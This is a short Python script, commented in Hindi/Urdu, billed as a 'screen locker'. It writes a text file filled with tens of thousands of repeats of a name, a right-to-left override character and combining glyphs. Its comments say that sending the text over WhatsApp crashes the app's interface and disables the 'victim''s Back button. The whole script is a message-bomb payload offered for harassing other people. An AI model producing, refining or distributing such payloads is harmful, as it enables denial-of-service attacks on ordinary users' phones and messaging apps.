import os

def screen_locker():
    print("="*40)
    print("   MEHDI BHAI ULTIMATE SCREEN LOCKER   ")
    print("="*40)
    
    name = "Ilove_YouW"
    # Ye characters WhatsApp ke UI layout ko crash karte hain
    ghost_char = "\u202e" # RTL character jo logic ulta kar deta hai
    crash_loop = (name + ghost_char + " ҉ " * 10) * 10000 
    
    file_name = "Locker_Ilove_YouW.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(crash_loop)
    
    print(f"[+] Done! '{file_name}' tayyar hai.")
    print("[!] Isay copy karke bhejte hi victim ka 'Back' button kaam karna chhor dega.")

screen_locker()
